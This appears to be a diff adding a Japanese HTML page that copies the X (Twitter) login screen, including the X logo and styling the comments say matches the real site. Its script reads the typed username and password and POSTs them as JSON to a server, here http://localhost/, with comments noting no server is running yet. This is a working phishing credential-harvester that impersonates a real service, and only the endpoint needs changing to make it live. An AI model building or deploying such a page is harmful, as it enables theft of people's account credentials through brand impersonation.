@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Xにログイン</title>
+    <style>
+        /* リセット */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            background-color: #000000;
+            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow-y: auto; /* 縦が狭いとき用のスクロール */
+        }
+
+        .container {
+            width: 100%;
+            max-width: 600px; /* 全体のコンテナは広めにとる */
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center; /* 画面中央へ */
+            padding: 16px;
+        }
+
+        .login-box {
+            width: 100%;
+            max-width: 300px; /* 入力欄自体の幅は狭くして本家に寄せる */
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ロゴ設定 */
+        .logo {
+            width: 30px;
+            height: 30px;
+            fill: #eff3f4;
+            margin: 0 auto 30px auto; /* 上下左右中央寄せ */
+            display: block;
+        }
+
+        h1 {
+            font-size: 31px;
+            font-weight: 700;
+            margin-bottom: 30px;
+            text-align: left; /* 左揃えっぽいが、コンテナが狭いので実質中央に見える場合も */
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 25px;
+            width: 100%;
+        }
+
+        .input-label {
+            display: block;
+            font-size: 15px;
+            color: #eff3f4;
+            margin-bottom: 8px;
+            line-height: 20px;
+        }
+
+        .text-input {
+            width: 100%;
+            height: 40px; /* 見た目調整 */
+            background-color: #000;
+            border: 1px solid #333639;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 16px;
+            padding: 8px 12px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .text-input:focus {
+            border-color: #1d9bf0;
+            border-width: 2px; /* フォーカス時に少し太くなる */
+        }
+
+        .login-btn {
+            width: 100%;
+            height: 48px; /* 少し大きめのボタン */
+            background-color: #1d9bf0;
+            border: none;
+            border-radius: 9999px;
+            color: #fff;
+            font-weight: 700;
+            font-size: 15px;
+            cursor: pointer;
+            margin-top: 10px;
+            margin-bottom: 30px;
+            transition: background-color 0.2s;
+        }
+
+        .login-btn:hover {
+            background-color: #1a8cd8;
+        }
+
+        .footer-links {
+            font-size: 14px;
+            color: #1d9bf0;
+            display: flex;
+            justify-content: flex-start; /* 左寄せ気味 */
+            flex-wrap: wrap;
+            gap: 5px;
+        }
+
+        .footer-links a {
+            color: #1d9bf0;
+            text-decoration: none;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        .dot { margin: 0 2px; color: #71767b; }
+        
+        /* スマホ向け微調整 */
+        @media (max-width: 600px) {
+            .container { justify-content: flex-start; padding-top: 40px; }
+            h1 { font-size: 26px; }
+            .login-box { max-width: 100%; padding: 0 10px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="login-box">
+        <!-- Xロゴ -->
+        <svg viewBox="0 0 24 24" class="logo" aria-label="X"><g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g></svg>
+
+        <h1>Xにログイン</h1>
+
+        <div class="input-group">
+            <label class="input-label" for="username">電話番号、メールアドレス、またはユーザー名</label>
+            <input type="text" id="username" class="text-input">
+        </div>
+
+        <div class="input-group">
+            <label class="input-label" for="password">パスワード</label>
+            <input type="password" id="password" class="text-input">
+        </div>
+
+        <button type="button" class="login-btn" id="loginBtn">ログイン</button>
+
+        <div class="footer-links">
+            <a href="#">パスワードを忘れた場合</a>
+            <span class="dot">·</span>
+            <a href="#">アカウント作成</a>
+        </div>
+    </div>
+</div>
+
+<script>
+    document.getElementById('loginBtn').addEventListener('click', function() {
+        const mailaddress = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        const data = {
+            mailaddress: mailaddress,
+            password: password
+        };
+
+        console.log("送信データ:", data);
+
+        fetch('http://localhost/', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+        })
+        .then(response => {
+            console.log("送信成功かも:", response);
+        })
+        .catch(error => {
+            console.log("サーバーが立っていないのでエラーになりますが、処理は実行されました。");
+            console.error("Error:", error);
+        });
+    });
+</script>
+
+</body>
+</html>
